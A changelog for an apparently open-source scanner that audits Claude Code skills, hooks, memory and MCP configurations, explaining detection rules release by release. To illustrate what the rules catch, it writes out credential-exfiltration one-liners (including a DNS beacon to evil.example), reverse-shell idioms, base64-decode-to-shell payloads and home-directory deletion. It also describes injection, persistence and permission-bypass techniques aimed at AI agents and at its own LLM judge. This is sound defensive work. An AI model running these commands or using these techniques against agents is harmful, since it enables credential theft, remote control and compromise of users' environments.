<!-- SPDX-License-Identifier: MIT -->
# Changelog

What each release changed and why, newest first after the v0.1.0 baseline. Per-source benchmark
numbers are deliberately absent: they live in `baselines/results/` with their denominators, and a
rate copied into prose goes stale on the next rule. `git tag` and the Releases page list versions.

## v0.1.0

- `scan` / `check` / `clean` / `hash` / `version` commands; terminal + JSON + self-contained HTML reports.
- 10 detection dimensions. Rules are grouped by dimension and derived from the public OWASP
  Agentic / MITRE ATLAS taxonomies (deliberately re-derived, not ported from another scanner).
  Counts are deliberately NOT written down here: a number in a roadmap goes stale on the next
  rule and nobody notices. `aguard scan --json` is the answer that cannot rot.
- Deterministic 0–100 risk score (max-per-dimension, additive, bucket-capped, LLM-excluded, reproducible).
- Junk cleanup: context bloat, duplicates, stale refs (markdown-link + multi-root resolution), zombie (opt-in `--zombie`).
- Invariants: never executes scanned content, no cross-root symlink reads, secret redaction before storage (+ high-entropy fallback).
- Single static binary (`CGO_ENABLED=0`), MIT + SPDX, CI, bilingual README.

## v0.2.0 – v0.15.0

**v0.15.0 (2026-09-29) — a sampled judge finding shows every vote, and the benchmark prints the denominator a tool declares.**

No rule changed, and no gate answer changes on any input: `--fail-on` still reads deterministic findings only, and the judge's findings
carry the same severity as before.

- **Every vote's severity is on record (P-035).** With `llm.samples: 3`, a judge finding kept only the first agreeing vote's
  self-assessed severity and dropped the others, so when the same sample came out differently on another run, nothing in the report
  said how far apart the three answers had been. The reason now lists each agreeing vote's severity in sample order, right after the
  existing count: `[2 of 3 samples agreed] [severities: high, medium]`. The finding itself still carries the first vote's severity:
  taking the severity a majority reached instead was measured on a run with every vote recorded and changed no verdict, so it was not
  adopted. `samples: 1` output, and the JSON/SARIF structure, are unchanged.
- **The benchmark reads what a tool says it does not detect (P-034, measurement rig only — not in the binary).** The corpus labels
  had a per-tool `out_of_scope` field that the scorer never read, so the recall bars in the plan could only be estimated by hand.
  `make bench` now passes the tool to the scorer, and its scorecard prints recall over the full denominator and over the samples the
  tool's own declaration keeps in scope, side by side; the full one is always there.

**v0.14.0 (2026-09-29) — rules that named a word now name what they mean, and two remote-control shapes stop at the gate.**

As before, every rule change below was decided on `agent-artifact-corpus` before and after, on the same denominator; the per-source counts
live in the proposal records of the internal archive, never here. Each of the three also ran against a real `~/.claude`, and two of
them were narrowed further because of what that found.

- **Tool descriptions that ask for secrets (P-028).** `MCP-001` read any `~/` path or any secret-sounding noun as a target, so a parameter
  describing what it accepts ("passwords will be masked"), a tool reading its own `~/.x/` directory, or `process.env` taken for a `.env`
  file were all flagged high — while "call the `read_file` tool on `~/.ssh/id_rsa`" passed, because `call` was not a verb it knew. The
  target is now a named sensitive location (`.ssh`, `.aws`, `id_rsa`, `authorized_keys`, a standalone `.env`, `/etc/passwd`, `.netrc`,
  `.npmrc`, `.docker/config.json`, `.kube/config`, `mcp.json`, `settings.json`, `.claude/settings.json`, `.cursor/mcp.json`) or a secret
  that belongs to the user. New `MCP-005` (high) flags a description that has the model add a fixed outside address to the bcc/cc of what
  the user sends. A bare "send the api key" with no owner, and a sensitive file behind an unlisted dot-directory, no longer fire here.
- **Recursive delete (P-029).** `FS-003` ("rm -rf against root/home") looked only at the path's first character, so clearing the npx
  cache, `~/Library/Caches/*` or the Dockerfile idiom `rm -rf /var/lib/apt/lists/*` read as deleting home. It now fires on the root of a
  tree — `/`, `~`, `$HOME` in any spelling including the quoted `"$HOME"`, or `*` — and recognises the same command under other flag
  spellings (`-fr`, `-Rf`, `-r -f`, `--recursive --force`, `--no-preserve-root`). Deleting a named directory under home is not this rule.
- **Beacons and remote instructions (P-030).** Two shapes passed with no finding. `EXFIL-007` (high) flags an identity command —
  `$(hostname)`, `$(whoami)`, `$(id)`, `$(uname)` — inside an outbound URL's query: the machine's identity beaconed out, which the
  exfiltration chain could not see because a host name is not a credential. `INJ-005` (high) flags fetching a remote file named like
  instructions (`instructions.md`, `commands.sh`, `steps.txt`, `payload.json`) — a file the skill then acts on. A local `/command` endpoint
  does not match. Installing with `sudo`, appending to a shell rc file and writing a git hook were measured and left alone: each is common
  in legitimate skills.
- Also: a static fix for defensive documents that quote injection payloads was measured and rejected (P-031, docs only). The three
  hard negatives involved come from one source, and the only two static fixes would either tune the detector to one language or accept
  author-controlled text as an exemption; the LLM judge already tells them apart.

**v0.13.0 (2026-09-29) — three shapes that passed the gate now stop at it, and a credential sent to its own service is no longer called exfiltration.**

As before, every rule change below was decided on `agent-artifact-corpus` before and after, on the same denominator; the per-source counts
live in the proposal records of the internal archive, never here. The order of the three came from a per-sample comparison with
cc-audit and a restated schedule (P-023).

- **Reverse shell (P-024).** A skill that hands an interactive shell to a remote host passed the gate. The one rule that knew the shape
  (`BD-003`) recognised three shell idioms and scored them low, and did not recognise the language-native form at all: a Python `socket`
  whose descriptor is duplicated onto 0/1/2 before `/bin/sh -i` scored 88/100 (W-027). `BD-004` (high; advisory, as spec §16 requires of
  dimension 7) fires on the shape, not the word — a shell's standard streams bound to a network socket, either as a shell one-liner
  (`>& /dev/tcp/…`, `nc -e sh`, `sh -i | nc`, `socat … EXEC:`) or, within one script, a socket opened and a shell's streams handed to it
  (Python, Node, Go). A connectivity probe (`echo >/dev/tcp/…`), a port wait, `nc -z` and an ordinary socket client stay quiet; `BD-003`
  remains as the keyword hint and yields on any line `BD-004` owns. The tool-name branches are anchored at a command position because the
  real-machine scan caught a minified JavaScript bundle matching the first version.
- **Destination consistency (P-025).** A file that reads a named credential and sends it to that credential's own service
  (`DEEPL_API_KEY` to `api.deepl.com`) was a high exfiltration chain, byte for byte the same as one that sends it to an attacker.
  `EXFIL-001` now drops to the `EXFIL-002` band — low, advisory, the downgrade loopback already had — when every readable, non-loopback
  destination in the file carries the service name of a credential the file reads. It fails closed: a whole-environment dump names no
  service, an unreadable destination or any unmatched host keeps it high, and the host is read raw so a homoglyph cannot pose as the
  service. Integration examples whose credential name does not appear in the domain, or that use a generic `$TOKEN`, are unchanged.
- **Decode then execute (P-026).** A base64 payload decoded straight into a shell (`echo … | base64 -d | sh`, `eval $(… base64 -d)`,
  `exec(base64.b64decode(…))`) reached the gate as one medium `base64 -d` note, with the `curl` to an attacker inside the blob.
  `EXEC-011` (high, dimension 4) reports that decoded content reaches an execution position. It decodes nothing — invariant #1 — so it
  does not claim to know what the payload does; the obfuscation stays `OBF-001`/`OBF-003` in dimension 6. Decoding to a file, into `jq`
  or a pager, and plain encoding stay quiet.
- **Benchmark rig (P-021, P-022 — maintainers).** The aguard adapter carries the LLM judge through three explicit, scan-only flags
  (`-aguard-extra-args`, `-aguard-env`, `-aguard-timeout`), and a run that passes `--llm` says in `run.yaml` that content left the machine
  (P-021). Cisco `skill-scanner` 2.1.0 becomes the third column (P-022): in its default strict mode it reads only the skills surface, and
  every sample it refuses is recorded as unsupported input, not as clean and not as missed. The benchmark never runs in CI.
- Also: the plan's precision schedule was restated against the new evidence (P-023, docs only); the 2026-09-25 (glm-5.3-flash) and
  2026-09-28 (gpt-4.1-mini) judge runs are committed under `baselines/results/aguard/` in their own directories, never as the baseline; a written review of the four comparison experiments.

**v0.12.0 (2026-09-26) — the configuration surface gets rules, the judge learns which of its questions may not move a score, and the benchmark rig grows a second column.**

As in v0.11.0, every rule change below was decided on `agent-artifact-corpus` before and after, on the same denominator, and the judge
change on a measured run of it; the per-source counts live in the proposal records of the internal archive, never here.

- **Configuration-surface shapes (P-016).** Four attacks written in plain sight in configuration produced no finding at all: an MCP server's
  `env` loading code into its interpreter (`NODE_OPTIONS=--require …`, `LD_PRELOAD`, `PYTHONSTARTUP` and kin — `EXEC-010`), a script that
  rewrites Claude Code's own settings or permissions file (`PERM-007`, scripts only: seven real skills say "add this to settings.json" in
  prose), a hook script that answers every permission prompt with `allow` (`PERM-008`), and a settings `env` block pointing
  `ANTHROPIC_BASE_URL` at a third-party host (`EXFIL-006`; official hosts and loopback excepted). The settings `env` block was not collected
  at all before this release, so an API key written into it was invisible too. Three sibling shapes were declined on the benign data —
  `enableAllProjectMcpServers`, `--dangerously-skip-permissions` in prose, `permissionDecision: allow` in prose — because each is what real
  skills teach. A `settings.json` counts as Claude Code's only with `.claude` beside it; another product's settings file is not ours to judge.
- **Judge: `LLM-009` is advisory only (P-019).** The MCP-configuration question — unpinned package, unknown publisher, credentials in env —
  is still asked and still reported with the model's own severity, but it never escalates, whatever the vote. On a measured run it was the
  only judge rule to escalate on benign input, and its reasons were what real configs look like (`npx -y … @latest` holding a token).
  The escalation bar in spec §5.2.1 gains a per-rule clause; the set is hard-coded in `internal/judge`, not a config knob.
- **Benchmark rig (P-015, P-017 — maintainers).** `hack/corpus-runner` is gone; `baselines/` replaces it: one adapter per scanner, a
  per-sample ledger in which every test point ends as scored or as a named reason (never silently absent), isolated execution, a tripwire
  for a surface that flags nothing, and results committed under `baselines/results/<tool>/<date>/` with version, commit and date. P-015 also
  found that the old runner had never handed 127 MCP-server-source samples to the binary at all; they are scored now, which is why the
  recall figure in the proposals fell while nothing in the engine changed. P-017 adds the first second column, cc-audit v3.23.9, through a
  shared SARIF fold, so a statement about a competitor's coverage now rests on 3,539 samples rather than one hook on one machine. The
  benchmark never runs in CI.
- Also: the doc-link test no longer walks git-ignored paths, which had kept it permanently red; the planning docs and the
  Makefile now say the same thing about the benchmark and CI.

**v0.11.0 (2026-09-21) — the exfiltration chain learns the shell's own words and stops reading documentation as requests.**

Every line below was decided against `agent-artifact-corpus` (3,539 labelled real-world samples) with the runner this release adds; the
per-source counts, with their denominators and caveats, are in the proposal records of the internal archive. No pooled rate is
quoted here on purpose: the corpus's own scorer refuses to pool sources, and so does this file.

- **Credential leg (P-010).** `cat ~/.aws/credentials | curl POST` completed an exfiltration chain; `env | curl POST` produced nothing at all.
  The leg knew `process.env` and `os.environ` but not the one-word shell form. Now a whole-environment dump in command position that is piped
  or redirected into a command (`env |`, `printenv |`, `set |`, `export -p |`, `env >`, `/proc/self/environ`), and a secrets dotfile read by
  path (`.env` and its stage variants, `.netrc`, `.npmrc`, `.git-credentials`, `.pypirc` after `cat`/`source`/`.`/`<`/`@`) count as reading a
  credential. A Markdown table cell `| … | env |`, the prose "set the variable", `cp .env.example .env` and "configure it in `~/.claude/.env`" do
  not — each was a real skill that the first version flagged. `EXFIL-004` still reports the dump; the chain reports where it went.
- **Network leg in instruction files (P-012).** In `SKILL.md` and `CLAUDE.md` a bare URL is documentation, not a request: an API-configuration
  example with `"Authorization": "Bearer ${API_TOKEN}"` a few lines from `https://api.example.com` was an `EXFIL-001` high, and it was the
  single largest false-positive shape on real published skills. The network leg there now needs an actual client call or covert-channel tool;
  in scripts a URL literal still counts, because the client may be one the verb list does not know. Two lexer fixes rode along: a `bash`/`sh`
  fence inside a Markdown instruction file joins `\`-continuations like a `.sh` file would, and a continuation joins the way the shell does —
  `cur\` + `l` is `curl`, not `cur l` (the old lexer inserted a space, which was one evasion sample's whole escape route).
- **Network leg in config units (P-013).** An `.mcp.json` server entry's `url` is the endpoint the config exists to talk to and its
  `Authorization` header is how it talks to it; reading the two as a chain turned the standard remote-MCP shape into `EXFIL-001` on real
  configs and caught no malicious one. A URL literal now counts as egress only in real script files. A `curl` or `nc` in a server's `args` is an
  action and still chains. The chain's gate also stopped admitting a connector's tool descriptions, which were never meant to run it — "send it
  to https://…" in a description is `MCP-004`'s job, and `MCP-004` still fires there.
- **Corpus runner (P-011, maintainers).** `make bench` stages every corpus sample where aguard looks (`.claude/` as root, `.mcp.json` beside it,
  `SKILL.md` under `skills/<id>/`, a `tools.json` catalogue as the desktop session cache), executes the built binary with an isolated HOME,
  folds each scan to one verdict at the gate's own predicate, and hands the verdicts to the corpus's tool-neutral scorer. Samples aguard cannot
  load (MCP server source code) get no verdict and are reported as such rather than counted either way. This is what made the three
  rule changes above measurable before and after, on the same denominator.

**v0.10.0 (2026-09-20) — the gate stops trusting what it already flagged, and the report can be pasted.**

- **Gate (P-005).** Three structural rules — `OBF-006`, `SUP-005`, `SUP-006` — now score **high**, so the default gate (`check --fail-on high`,
  the load-time hook) blocks the artifacts they fire on; `OBF-007` stays low. Measured before the change: the four Trail of Bits
  `overtly-malicious-skills` samples were all flagged by the report and all passed the gate at 88/100 — and were then **recorded as trusted**
  by content hash, so the same bytes were never asked about again. Now a pass that still carries a medium finding is announced on every
  load and is never remembered as trusted. Rule counts on one real install of 80 skills: zero hits before and after. Three cross-machine
  checks from the proposal (blocked-count does not rise on the 952-sample machine; `security-guidance` is not blocked; per-rule hit counts there)
  are still listed as unverified in that release's proposal record (internal archive).
- **`--md` (P-008).** `aguard scan|check --md <path>` writes the report as GitHub-flavoured markdown; `--md -` writes it to stdout in place
  of the terminal report, so `aguard check ./new-skill --md - | gh pr comment N --body-file -` posts a vetting result without retyping it.
  Same content and order as the terminal, written before the gate, unaffected by `--verbose`. Every name, path and snippet from the scanned
  tree is emitted inside a code span, so a file named `@someone` or `<img src=…>` cannot ping a person or load an image from the comment.

**v0.9.0 (2026-09-15) — phase 0 of the internal plan, "stop the
bleeding": thirteen defects from the internal work-item list, each with a
regression test.** Four ways a hostile artifact reached 100/100 in silence are closed: an
executable-but-unreadable directory (`chmod 0111`) is disclosed and changes the tree hash
(W-001/W-005); `check` no longer lets a 29-byte `settings.json` inside the target re-route it
to the root collectors (W-003); an `@import` of a credential is refused before an artifact
exists and scored as `EXFIL-005` (W-006); every read of a user file goes through
`internal/safeio` — non-regular files refused before Open, size capped by the read — and the
gate's pre-scan reads have a deadline (W-002a/W-002b/W-004). Four false positives from the
third-party review are closed with the real attack still firing: leading BOM, `os.environ.copy()`
for a child process, `atob(` reported twice, and a skill's own anti-injection clause judged as
INJ-001 (W-007..W-010). The report neutralises bidi characters in names, counts skills inside
plugins, and names the worst artifact beside the mean (W-011..W-013). 73 rule IDs.

Static coverage gaps closed — no LLM, no new dependencies:

- **Loopback is not exfiltration** — `EXFIL-001/003` drop to low + advisory when every network
  target in the file is a loopback literal, including the JS sidecar shapes url.Parse rejects
  (`http://localhost:${PORT}`, `hostname: '127.0.0.1'`, `ws://`). Homoglyph hosts and unknown
  destinations stay high. `HOOK-002` scores a hook whose second stage sits outside HOME (quoted
  paths with spaces included); `HOOK-003` audits HTTP-type hooks by destination and event.
- **Allowlist entries carry their review** — a `good` entry records source, sha, reviewer date,
  reason and the finding fingerprint it covers (`REP-GOOD` prints the reason). `make
  reputation-refresh` renews an entry when the official marketplace pins a new commit with the
  same fingerprint and refuses when it differs; a weekly workflow turns renewals into a PR.
  Plugins the marketplace vendors in its own repository are pinned by (marketplace commit,
  path); `-add <plugin>` drafts an entry with a review sheet and an empty reason. `.in_use/`
  session markers are excluded from the canonical hash — they were the only reason an installed
  plugin's hash differed from its source commit. First curated entry: superpowers 6.3.0.
- **`PERM-006` escapable binaries** — `Bash(git *)` and friends reach arbitrary execution
  through an everyday tool; deterministic, so it scores and gates like any static finding.
- **Per-command hook artifacts** — a hook is (event, matcher, command); findings name the
  exact command, and the local script a hook invokes is followed and scanned.
  `HOOK-001` flags shell chaining/substitution in a hook command (spec §5.1).
- **`KindPlugin` collection** — installed plugins (`plugins/installed_plugins.json`) were
  declared but never scanned; they are now collected and scanned as a tree.
- **`EXFIL-002` cross-file screen** — credentials read in one file + outbound network in
  another, within one artifact. Low + advisory: much weaker than the same-file `EXFIL-001`.
- **Coverage notes coalesce** — the structurally repetitive `COV-000` notes (unread hook
  scripts, unread granted scripts, third-party trees) merge into one note each, carrying every
  instance as evidence and a reason breakdown ("3 × unresolved variable; 2 × no such file").
  A real `~/.claude` produced 53 hook-script notes out of 60 warnings, which buried the two that
  named something specific — and because one hook command names several scripts, several of the
  53 rendered as the same hook name twice: the field that told them apart, the script reference,
  was never printed. Notes now list their instances with that reference, on the same three-line
  budget and remainder line a finding group uses. 60 warnings → 7 on that environment.
- **A plugin hook's script is LOCATED in the tree it ships in** — and the note about it stopped
  lying. 54 of those warnings said a hook's second stage "was NOT scanned" while the same scan
  reported `EXEC-001` and `EXEC-009` from those very files under the plugin artifact; a gap
  statement that overstates itself fails §12 in the other direction, and costs more, because an
  operator who checks one and finds it wrong has no reason to believe the next fifty-three. A
  plugin hook names its script through the plugin root (`_R="${CLAUDE_PLUGIN_ROOT}"; node
  "$_R/scripts/x.js"`), and expanding that would mean interpreting shell — the `[ -z ]` fallback
  on the line above gives `_R` two possible values, so picking one IS a guess. Asking whether
  `scripts/x.js` exists inside the plugin's own directory is a filesystem fact instead:
  `model.Hook.OwnerRoot` plus a longest-suffix lookup (≥2 segments, so a bare basename can never
  match, every candidate containment-checked). A hit is deliberately NOT re-read — measured
  first: five hooks routed through one `runner.js` took a fixture from 9 findings to 29 and
  `EXEC-001` from 1 to 6, which is issue 008's inflation arriving by another door. The note
  instead names the file and says what is actually missing, which is the ATTRIBUTION: "this
  plugin contains a script that pipes curl into a shell" and "this hook runs it on every matching
  tool call" are different sentences. That gap is recorded in `issues/010`.
- **Credential leg requires a secret** — the chain's first leg counted ANY environment access,
  so a skill documenting `process.env.NODE_ENV` beside a docs URL became an exfiltration
  surface. Measured over 169 real skill files, 55% of credential-leg matches were reads of
  plainly non-secret names. It now needs a secret-ish word on the line, a whole-map read
  (`JSON.stringify(process.env)` — no key named, and none needed), or a dynamic index
  (`process.env[which]` — the tool cannot see the key, so it cannot claim the value is safe).
  The dynamic-index branch reads the RAW line only: quotes are the sole difference between
  `[which]` and `["NODE_ENV"]`, and the normalized view strips them. End to end on 61 of those
  skills, the chain went from 8 findings to 0 with `overall` unchanged; all seven attack shapes
  still fire and are pinned in the corpus. The chain also cites the CLOSEST pair of legs now
  (median cited gap 46 lines → 6) in file order, deduped — the verdict is unchanged, the
  argument for it is findable. The NETWORK leg is still the dominant false-positive source and
  two candidate fixes were measured and rejected: see `issues/016`.

The LLM intent judge (**was B.5**, delivered as M5/M5.1/M5.2) — isolated model, nonce barrier,
off by default, local endpoint by default, redacted content only. It was still sitting under
"Later, not scheduled" while these four sections described it in detail.

Auto-loaded surfaces — the collector read eight of the places Claude Code loads instructions
from and missed twelve others, so a payload parked in any of them scored a spotless environment.
No LLM, no new dependencies; the existing rule set does the work once the content is reachable:

- **`rules/**/*.md` (recursive, `KindRule`)** — a rule without `paths:` frontmatter loads every
  session at the priority of `.claude/CLAUDE.md`. Discovery is recursive and does NOT skip
  dot-directories: "hidden" is a display convention, not a loading rule. A `paths:`-scoped rule is
  named as such, since "loads always" and "loads when you open a matching file" cost differently.
- **`workflows/` (`KindWorkflow`)** — loaded at startup, each file becoming a `/<name>` command, and
  a workflow orchestrates subagents. An execution surface, not prose.
- **`output-styles/` (`KindOutputStyle`)** — a selected style is injected as a section of the SYSTEM
  PROMPT, the most privileged position any scanned content can hold.
- **Auto memory (`KindMemory`)** — `projects/<project>/memory/` and `agent-memory/<agent>/`. Claude
  writes these itself and they load into every later session, so one injected line converts a
  one-shot compromise into persistence. Markdown only: the same tree holds `<session>.jsonl`
  transcripts, which per Claude Code's own docs contain whatever a tool read, credentials included.
- **`@path` imports, followed recursively to four hops** — matching the documented limit, resolving
  relative to the importing file, skipping code spans and fenced blocks so a backticked `@README`
  stays literal. A CLAUDE.md whose body is a handful of `@` lines reads as almost empty while
  loading everything it points at; the payload was hiding one hop away.
- **The rest of the CLAUDE.md family** — `<root>/CLAUDE.local.md`, and the project-level
  `CLAUDE.md` / `CLAUDE.local.md` beside root. One file was read where Claude Code loads several.
- **`skills/synced/**`** — `synced` is a reserved directory holding the skills enabled on claude.ai,
  one level deeper than an ordinary entry, so the first-level walk found none of them.
- **Namespaced `commands/` and `agents/`** — both are now walked recursively. The flat read skipped
  every subdirectory, dropping `commands/foo/bar.md` (invoked as `/foo:bar`) outright.
- **Project-level `.mcp.json`** — servers declared beside a project's `.claude` were invisible;
  only the user-level `~/.claude.json` was read. MCP server order is now sorted, so an unchanged
  environment stops producing a different artifact order on every run.
- **Managed policy is DISCLOSED, not scanned** — an organisation-deployed `CLAUDE.md` loads first
  and cannot be excluded, but it lives at an absolute OS path unrelated to `--root`. Scanning it
  would make `overall` depend on how the machine is administered, and `overall` is the number a
  third party must be able to recompute offline. A `COV-000` names the file instead.

- **Role is taken from the artifact kind, not the filename** (pre-existing under-scan; **the forced-role fix described here was tried and reverted in the same change** — 8 high findings on the hookify plugin's prose about `rm -rf` and a red gate, see `TestScan_BenignProseIsNotFlagged`. Subagents and slash commands are still `roleDoc` today; recorded as stale by P-016, 2026-09-23, to be decided in its own proposal).
  `roleForPath` downgrades every `.md` except `CLAUDE.md`/`SKILL.md` to `roleDoc` — injection and
  secrets only — which silently exempted subagents, slash commands and workflows from the
  EXEC/OBF/FS families: a subagent instructing `curl … | bash` produced no execution finding at
  all. Being one of these artifacts IS the evidence that Claude Code loads and acts on the file.
  Filename-derived roles remain correct inside a tree, where a bundled README cannot be told from
  payload by name.

Cleanup safety — `clean --apply` moves files, so the machinery around the move is the feature:

- **Quarantined content is scanned and SCORED** (`KindQuarantined`). Leaving `.aguard-trash` unread
  took an environment from 69/100 to a clean 100/100 while the malicious file sat in the config
  root, which made `clean --apply` the shortest path to turning a red `--fail-on` green. A move is
  not a deletion; the number improves when the content is gone.
- **Manifest with write-ahead records, plus `--undo <batch|last>`.** Recovery used to be a `mv` line
  reconstructed from a naming convention — wrong for a symlink-installed skill and for the second
  quarantine of a same-named one, and absent entirely if the process died mid-move. An interrupted
  batch is now reported rather than swallowed.
- **Undo re-derives every safety decision.** The manifest is a plain file in the user's config root,
  so anything that can write there can append a row; trusting `from` as written made undo an
  arbitrary file write, one crafted row away from installing an attacker's `settings.json`.
  Containment, the security-config exclusion, and content identity are each checked independently.
- **Exclusive lock** (O_EXCL, not flock — this binary ships for Windows with CGO off, and a
  silently-absent lock is the worst outcome for a race that loses data quietly).
- **Exit code 3 for partial runs**, with every blocked item named. Returning 0 after moving nothing
  let `clean --apply && deploy` proceed believing the cleanup ran.
- **Zombie evidence is graded.** `history.jsonl` is typed prompts, not invocations — a skill Claude
  routed to on its own left no trace, so it read as unused. Session transcripts are now read too
  (membership-tested, streamed under a byte cap, never echoed: they contain whatever a tool
  printed). Prompts alone → low confidence; transcripts → medium. Never high, so zombies still
  cannot join an unattended batch.
- **Not reimplemented, deliberately: retention for runtime data.** Claude Code already ages out
  transcripts, caches and snapshots via `cleanupPeriodDays`, and `claude project purge` deletes
  per-project state with a plan and a confirmation. A second deletion source would be worse and
  riskier. The one gap is auto memory, which no automatic policy covers — and that is a
  report-only case, not a delete-for-you one (issues/012).

Judge infrastructure — still advisory-only, no new authority:

- **Concurrent judging with a per-call timeout** — one whole-run clock meant a handful of slow
  answers starved every remaining check. Calls now run in parallel with their own deadline,
  and results merge by index, so the output is identical to a serial run.
- **Call budget + 429/5xx backoff** — over-budget calls are skipped *and named*; a rate-limited
  endpoint is retried (`Retry-After` honoured) instead of dropping a batch of checks.
- **Evidence grounding + `LLM-005`** — a flagged verdict must quote text that actually appears
  in what was sent, checked against the redacted copy (never the file on disk). Grounded
  findings gain a real `file:line`; unquotable ones are discarded and counted.
- **Usage line** — every `--llm` run prints calls / p50 / p95 / tokens to stderr.

Judge coverage — the judge looked at skills and nothing else, so the surfaces where a
rewritten injection hides best had zero semantic coverage. Still advisory-only:

- **Injection now runs on `CLAUDE.md`, subagents, slash commands and hooks**, unconditionally.
  Gating it on a static hit would leave the judge re-examining only what the regexes already
  caught — precisely the blind spot it exists for.
- **`LLM-008` hook capability** — is the command proportionate to the event that triggers it?
  Hooks deliberately get no *intent* check: an event name says when a hook runs, never what it
  ought to do, so a "description vs. behavior" comparison has nothing on the other side.
- **`LLM-009` MCP configuration** — source, pinning, transport, credentials. Explicitly NOT
  tool poisoning: that needs a connection to the server, which this tool never makes.
- **`LLM-006` cross-file collusion** — triggered by the static `EXFIL-002` screen, and sent as
  a capability digest (the already-redacted evidence lines) rather than the files themselves.
- **Triage extended to every kind with static findings**, including permissions.

Dual score — the judge gets a number of its own. Note this SUPERSEDES the old B.5 wording
("advisory, never scores"): a qualified verdict now moves `overall_effective`. It still
cannot move `overall`, and it still gates nothing unless `llm.authority` says otherwise:

- **`overall_effective` / `score_effective`** — the same formula with judge findings folded
  in, always ≤ the deterministic number (enforced by the formula's shape, not by convention).
  `overall` stays byte-identical with or without `--llm`, which is what `--fail-on` and any
  future attestation depend on.
- The report **names the artifacts the judge moved**, because the environment score is damped
  twice (averaged, then bucket-capped) and routinely doesn't budge while individual artifacts
  drop thirty points — comparing only the headline numbers would hide the entire signal.
- **`LLM-007`, the artifact talking back** — when the fenced content addresses the analyzer
  instead of describing the artifact, that becomes a finding of its own, from any pass and
  independent of the verdict. Severity is fixed at high by us, never taken from the model: a
  hijacked model grading its own report of being hijacked would hand over the volume knob. It
  still has to be quotable and still faces the consensus bar. Note the asymmetry — a report
  means an attempt was made; silence means nothing, since a successful manipulation would not
  be reported.
- **`llm.samples` consensus** (default `1` = off) — asks each question N times and requires a
  majority before a finding may carry weight. Below the bar a finding is still reported, with
  its vote attached: "the model wasn't consistent" is not "it isn't there", and the judge may
  only ever add. Sampling raises the temperature (at 0 the votes agree by construction and
  measure nothing) and that variance is proven not to reach `overall`.

- **`--fail-on-llm` + `llm.authority`** — a SECOND gate, so the reproducible one keeps its
  contract. Opt-in twice (flag *and* `authority: escalate`); passing the flag without authority
  is refused with an error rather than ignored, because a gate that silently never fires is
  worse than no gate. Authority governs the gate, not the number — `overall_effective` stays
  visible under `advisory`, since you have to see what the judge would do before deciding
  whether to let it. The scoring and gating predicates are now a single exported definition
  each, so the two can't drift apart.

Previously listed as planned, now shipped — moved here because a roadmap that only ever
appends is worse than one nobody updates: it looks current while five done items sit in the
backlog, and the next person implements one of them twice.

- **Reputation library** — an embedded, versioned allowlist/blocklist keyed by canonical
  content hash. A known-good match suppresses that artifact's scoring findings and records a
  `REP-GOOD` note carrying the highest severity it suppressed; a known-malicious match adds a
  `REP-BAD` critical. Offline and deterministic, so it may feed the score. `aguard hash`
  prints the key a maintainer adds. (The *cloud* half of D.11 is still open — see Later.)
- **A.2 rule expansion** — `Function()`, `setTimeout("code")`, `powershell -enc` and the named
  secret prefixes are in the rule set.
- **A.3 concurrent artifact scanning** — `detect.Engine.Run` scans artifacts on a bounded
  worker pool and writes results BY INDEX, so finding order is identical to a serial run. Speed
  changed; output did not.
- **A.4 ignore / baseline** — `.aguardignore` (rule ID, optionally path-globbed). Suppression
  happens before scoring and is counted in an `IGN-000` note carrying the highest suppressed
  severity, so a baseline cannot quietly lift the leaky-bucket cap.
- **B.6 `clean --apply`** — quarantines zombie skills into a reversible `<root>/.aguard-trash`,
  with `--dry-run`. Deliberately narrower than the original entry: only zombies, and only
  moves. Deleting or downgrading other hygiene kinds (`context_bloat`, `stale_ref`,
  `duplicate_fn`) is NOT implemented and is not currently planned — those are judgement calls
  about someone's own files, and a tool that quietly rewrites them is a worse trade than a
  tool that lists them.
- **A.5/A.6/A.7 merged with `feat/escalation-plan`** — the same four gaps were closed twice,
  independently, and the result is the union rather than either branch. What came from there:
  `detect/logical.go`'s lexical pass (it also folds interior quoting, which `cu""rl` needs, keeps a
  raw view for evidence, and tries rules on raw FIRST so normalising can add a finding and never
  remove one) and `collect/unowned.go` (which does not merely disclose unowned entries — it reads
  the loose files that look like code, and leaves top-level directories unread on purpose, because
  on a real machine those are the user's transcripts and shell snapshots).
  What came from here: **homoglyph folding**, which that branch explicitly did not do, plus the
  precision it needs; **reading by content sniff instead of by extension**, which it had not
  changed; and the auto-loaded surfaces, whose collection it predates.
  Two conflicts worth recording: `fileHash`/`treeHash` were exported here for the `clean` package,
  so every caller moved to the exported names; and the mixed-script rule is **`OBF-005`**, because
  `OBF-004` was already taken by the encode-in-the-middle leg of the exfil chain — two rules on one
  ID would collapse to a single row in every report and a single entry in a baseline.
  Precision was **measured before landing**, following issue 011's lesson. An earlier version folded
  typographic punctuation through the same table as the letters and counted both, which scored this
  repository's own Chinese documentation 88/100 with three medium findings — 47 "homoglyphs" on
  prose. The fix is that "mixing" is now encoded in the RULE (`OBF-005` requires ASCII and
  Cyrillic/Greek inside one token), so a whole-word foreign token — there is a Russian one in our own
  README — is a word rather than a disguise, and punctuation, a trailing CR and a leading BOM cannot
  match at all. Benign prose scans 100/100 while five evasions are caught: homoglyph, invisible
  character, line continuation, interior quoting, and a payload in an extensionless file.
- **A third leg on the exfil chain, and the channels it can leave by** — `EXFIL-003` +
  `OBF-004`. Two gaps, one shape:
  - Every obfuscation rule watched DECODING — a payload arriving. Nothing watched **encoding**,
    which is the step "steal it and hide what you stole" needs. `encodeRE` (base64 / btoa /
    `openssl enc` / `gpg -c` / hex) is now the chain's third leg. Compression is deliberately
    excluded: upload scripts compress constantly, so it carries no intent signal.
  - `networkRE` knew only front-door HTTP clients, so **`dig $(base64 ~/.aws/credentials).evil.example`
    completed no chain at all** — the credential leg matched and the strongest shape in the
    corpus produced silence. DNS, `nc`/`socat`, `/dev/tcp`, `scp`/`rsync`, `ssh` and `sendmail`
    now count. A bare tool name must be in command position (line start, or after `|`/`;`/`&`/`$(`),
    or "dig into the config.yaml" in a SKILL.md becomes half an exfil chain.

  The encoded case reports as `EXFIL-003` (dim 3, high) **plus** `OBF-004` (dim 6, medium), and
  `EXFIL-001` is then suppressed. The dimension split is the point: scoring maxes within a
  dimension and adds across them, so a second dim-3 finding at the same severity would move the
  number by nothing, and the only way to move it from inside dimension 3 would be to call this
  critical — capping the whole environment at 49 on the strength of a co-occurrence the finding
  itself calls unconfirmed. In dimension 6, where encoding belongs anyway, the two penalties add.
  Still static, still deterministic, so unlike an LLM verdict it scores and it gates — which is
  the point, since `check` (the CI gate) never calls the judge at all.
- **The unowned half of a root is no longer silent** (`collect/unowned.go`). The root collectors
  are an allowlist of layouts, so a root containing
